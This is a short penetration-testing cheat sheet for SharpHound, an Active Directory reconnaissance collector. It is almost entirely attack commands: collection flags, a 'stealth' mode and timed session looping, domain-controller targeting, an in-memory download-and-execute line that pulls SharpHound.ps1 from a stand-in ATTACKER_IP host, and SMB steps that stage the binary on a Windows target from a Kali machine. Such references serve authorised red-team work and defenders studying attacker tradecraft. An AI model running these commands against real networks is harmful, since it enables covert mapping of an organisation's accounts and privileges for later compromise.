# sharphound CHEATSHEET

## Quick Reference

### Basic Collection
```powershell
.\SharpHound.exe -c All
```

### Collection Types
```powershell
-c Users                # Users
-c Groups               # Groups
-c Computers            # Computers
-c ACLs                 # ACLs
-c Sessions             # Sessions
-c All                  # Everything
```

### Stealth Options
```powershell
.\SharpHound.exe -c All --stealth
.\SharpHound.exe -c All --loop --loopduration 02:00:00
.\SharpHound.exe -c Sessions --loop --loopduration 01:00:00
```

### Domain Options
```powershell
.\SharpHound.exe -c All -d corp.local
.\SharpHound.exe -c All --DomainController 192.168.1.1
.\SharpHound.exe -c All --UseSSL
```

### PowerShell Version
```powershell
# Download and execute
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/SharpHound.ps1')
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
```

### Transfer
```bash
# On Kali
impacket-smbserver share . -smb2support

# On Windows
copy \\ATTACKER_IP\share\SharpHound.exe C:\temp\
```

---

## Target: Windows

```powershell
# Full collection
.\SharpHound.exe -c All --outputdirectory C:\temp

# Transfer zip to Kali and import to BloodHound
```
